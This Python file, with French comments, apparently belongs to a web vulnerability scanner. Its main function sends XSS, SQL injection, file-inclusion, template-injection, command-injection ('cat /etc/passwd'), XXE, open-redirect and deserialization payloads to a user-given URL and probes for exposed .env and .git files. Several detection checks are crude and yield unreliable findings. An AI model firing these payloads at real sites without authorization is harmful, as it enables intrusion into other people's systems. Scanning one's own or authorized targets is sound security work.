from pystyle import Colors, Colorate
import logging
import ipaddress
import os
import requests
from bs4  import BeautifulSoup
from urllib.parse import urljoin
import re

# Fonction pour afficher un message coloré
def print_colored_message(message):
    try:
        print(Colorate.Horizontal(Colors.red_to_yellow, message))
    except Exception as e:
        logging.error(f"Erreur lors de l'affichage du message coloré : {e}")
        print(message)  # Afficher sans couleur en cas d'erreur

# Fonction pour afficher un menu de choix
def afficher_choix(choix):
    if not isinstance(choix, list):
        logging.error("Le paramètre 'choix' doit être une liste.")
        return

    custom_gradient_choices = Colors.green_to_blue + Colors.blue_to_cyan
    print("\n" + Colorate.Horizontal(custom_gradient_choices, "Choisissez une option :".center(80)))
    
    for index, option in enumerate(choix, start=1):
        ligne = f"{index}) {option}".center(80)
        print(Colorate.Horizontal(custom_gradient_choices, ligne))

# Fonction pour afficher un titre avec un pseudo
def titre(pseudo):
    custom_gradient_title = Colors.yellow_to_green + Colors.green_to_blue
    message = f"Bienvenue, {pseudo} !"
    print(Colorate.Horizontal(custom_gradient_title, message.center(80)))

# Fonction pour afficher un message malveillant
def malvaillant(message):
    print(Colorate.Horizontal(Colors.red, message))

# Fonction pour afficher un message suspect
def suspectes(message):
    print(Colorate.Horizontal(Colors.yellow, message))

# Fonction pour afficher un message inoffensif
def innofensives(message):
    print(Colorate.Horizontal(Colors.blue, message))

# Fonction pour afficher un message non détecté
def non_détéctés(message):
    print(Colorate.Horizontal(Colors.green, message))

# Fonction pour valider une adresse IP
def is_valid_ip(ip_address):
    if not ip_address:
        logging.error("Adresse IP non fournie.")
        return False
    
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        logging.warning(f"Adresse IP invalide: {ip_address}")
        return False

# Fonction pour formater l'information sur le fuseau horaire
def format_timezone(timezone_info):
    if timezone_info:
        return f"{timezone_info.get('name')} (UTC{timezone_info.get('offset')})"
    else:
        return "Non disponible"
    
def clear_screen():
    """Efface l'écran en fonction du système d'exploitation."""
    os.system('cls' if os.name == 'nt' else 'clear')

def is_valid_username(username):
    """Vérifie si le nom d'utilisateur respecte le format attendu."""
    return bool(re.match(r"^[a-zA-Z0-9._-]{3,50}$", username))

def detect_vulnerabilities(target_url):
    """
    Analyse une URL pour détecter des vulnérabilités courantes : XSS, SQLi, LFI, SSTI, RCE, Open Redirects, XXE, Command Injection, etc.
    """
    results = {"vulnerabilities": [], "recommendations": []}
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"})
    
    try:
        if not target_url.startswith(("http://", "https://")):
            raise ValueError("URL invalide - doit commencer par http:// ou https://")
        
        response = session.get(target_url, timeout=10, verify=True, allow_redirects=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 1. XSS Tests
        xss_payload = '<script>alert(1)</script>'
        for form in soup.find_all('form'):
            form_url = urljoin(target_url, form.get('action', ''))
            for input_field in form.find_all('input'):
                if input_field.get('type') != 'submit':
                    data = {input_field.get('name', 'input'): xss_payload}
                    test_response = session.post(form_url, data=data, timeout=5)
                    if xss_payload in test_response.text:
                        results["vulnerabilities"].append(f"XSS détecté dans un formulaire : {form_url}")
        
        # 2. SQL Injection Tests
        sql_payloads = ["' OR '1'='1", "' UNION SELECT NULL, NULL, NULL --"]
        for payload in sql_payloads:
            test_response = session.get(f"{target_url}?id={payload}", timeout=5)
            if "error" in test_response.text.lower() or "sql" in test_response.text.lower():
                results["vulnerabilities"].append("Injection SQL détectée dans l'URL")
                break
        
        # 3. LFI Tests
        lfi_payloads = ["../../etc/passwd", "../../windows/win.ini"]
        for payload in lfi_payloads:
            test_response = session.get(f"{target_url}?file={payload}", timeout=5)
            if "root:x:" in test_response.text or "for 16-bit app support" in test_response.text:
                results["vulnerabilities"].append("Local File Inclusion détecté")
                break
        
        # 4. SSTI Tests
        ssti_payloads = ["{{7*7}}", "{{config.__class__.__mro__[1].__subclasses__()}}"]
        for payload in ssti_payloads:
            test_response = session.get(f"{target_url}?template={payload}", timeout=5)
            if "49" in test_response.text:
                results["vulnerabilities"].append("Server-Side Template Injection détecté")
                break
        
        # 5. RCE Tests (ATTENTION, très intrusif)
        rce_payloads = ["; ls", "; cat /etc/passwd"]
        for payload in rce_payloads:
            test_response = session.get(f"{target_url}?cmd={payload}", timeout=5)
            if "bin" in test_response.text or "root:x:" in test_response.text:
                results["vulnerabilities"].append("Remote Code Execution détecté")
                break
        
        # 6. Open Redirects Tests
        redirect_payload = "https://evil.com"
        test_response = session.get(f"{target_url}?next={redirect_payload}", timeout=5, allow_redirects=True)
        if test_response.url == redirect_payload:
            results["vulnerabilities"].append("Open Redirect détecté")
        
        # 7. Vérification de fichiers sensibles
        sensitive_files = ["robots.txt", ".git", ".env", "backup.sql"]
        for file in sensitive_files:
            test_response = session.get(urljoin(target_url, file), timeout=5)
            if test_response.status_code == 200:
                results["vulnerabilities"].append(f"Fichier sensible accessible : {file}")
        
        # 8. CORS Tests
        if "Access-Control-Allow-Origin" in response.headers and "*" in response.headers["Access-Control-Allow-Origin"]:
            results["vulnerabilities"].append("CORS mal configuré - permet toutes les origines")
        
        # 9. Clickjacking Tests
        if "X-Frame-Options" not in response.headers:
            results["vulnerabilities"].append("Protection contre le clickjacking absente")
        
        # 10. XXE (XML External Entity) Tests
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
                        <!DOCTYPE foo [ 
                        <!ELEMENT foo ANY >
                        <!ENTITY xxe SYSTEM "file:///etc/passwd" >] 
                        <foo>&xxe;</foo>"""
        headers = {'Content-Type': 'application/xml'}
        test_response = session.post(target_url, data=xxe_payload, headers=headers, timeout=5)
        if "root:x:" in test_response.text:
            results["vulnerabilities"].append("Injection XML External Entity (XXE) détectée")
        
        # 11. Command Injection Tests
        command_payloads = ["| ls", "| cat /etc/passwd"]
        for payload in command_payloads:
            test_response = session.get(f"{target_url}?cmd={payload}", timeout=5)
            if "root:x:" in test_response.text or "bin" in test_response.text:
                results["vulnerabilities"].append("Injection de commande détectée")
                break
        
        # 12. HTTP Response Splitting Tests
        response_splitting_payload = "\r\nSet-Cookie: test=1; HttpOnly"
        test_response = session.get(f"{target_url}?cookie={response_splitting_payload}", timeout=5)
        if "Set-Cookie" in test_response.headers:
            results["vulnerabilities"].append("HTTP Response Splitting détecté")
        
        # 13. Insecure Deserialization Tests
        insecure_deserialization_payload = """O:8:"TestClass":1:{s:4:"test";s:4:"test";}"""
        headers = {'Content-Type': 'application/x-serialized'}
        test_response = session.post(target_url, data=insecure_deserialization_payload, headers=headers, timeout=5)
        if "Error" in test_response.text:
            results["vulnerabilities"].append("Insecure Deserialization détectée")
        
    except requests.exceptions.RequestException as e:
        results["error"] = f"Erreur de connexion : {str(e)}"
    except Exception as e:
        results["error"] = f"Erreur inattendue : {str(e)}"
    
    return results